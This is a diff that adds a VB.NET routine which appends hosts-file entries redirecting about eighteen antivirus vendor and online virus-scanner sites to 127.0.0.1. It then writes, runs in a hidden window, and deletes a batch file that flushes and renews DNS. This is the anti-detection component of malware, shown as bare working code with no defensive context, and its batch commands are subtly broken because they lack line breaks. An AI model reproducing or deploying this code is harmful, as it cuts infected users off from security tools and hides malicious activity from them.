@@ -1,0 +1,79 @@
+Shared Sub W
+
+            WebBlock("www.novirusthanks.org")
+
+            WebBlock("www.virustotal.com")
+  
+            WebBlock("www.virusscan.jotti.org")
+
+            WebBlock("www.malwarebytes.org")
+  
+            WebBlock("www.bitdefender.com/scanner/online/free.html")
+    
+            WebBlock("www.eset.com/online-scanner")
+
+            WebBlock("housecall.trendmicro.com")
+  
+            WebBlock("www.kaspersky.com/scanforvirus")
+            
+            WebBlock("www.kaspersky.com/virusscanner")
+
+            WebBlock("www.f-secure.com/en_EMEA/security/tools/online-scanner/")
+
+            WebBlock("www.windowsecurity.com/trojanscan")
+
+            WebBlock("www.avg.com")
+   
+            WebBlock("www.avast.com")
+    
+            WebBlock("www.avira.com")
+   
+            WebBlock("www.zonealarm.com")
+    
+            WebBlock("www.Symantec.com")
+            
+            WebBlock("security.symantec.com")
+
+            WebBlock("www.pandasecurity.com")
+            
+			Dim FS As String = System.Windows.Forms.Application.StartupPath & "\DNS.bat"
+            
+            Dim SW As New IO.StreamWriter(FS)
+            
+            SW.Write("ipconfig/flushdns")
+            
+            SW.Write("ipconfig/release")
+            
+            SW.Write("ipconfig/renew")
+            
+            SW.Flush()
+            
+            SW.Close()
+
+            Dim P As New System.Diagnostics.Process
+            
+            P.StartInfo.FileName = FS
+            
+            P.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden
+            
+            P.Start()
+            
+            P.WaitForExit()
+            
+            IO.File.Delete(FS)
+
+End Sub
+
+Shared Sub WebBlock(ByVal Address As String)
+
+        Dim SW As New IO.StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.System) & "\drivers\etc\hosts", True)
+        
+        SW.WriteLine(Environment.NewLine)
+        
+        SW.WriteLine("127.0.0.1     " & Address)
+       
+        SW.Flush()
+        
+        SW.Close()
+
+End Sub
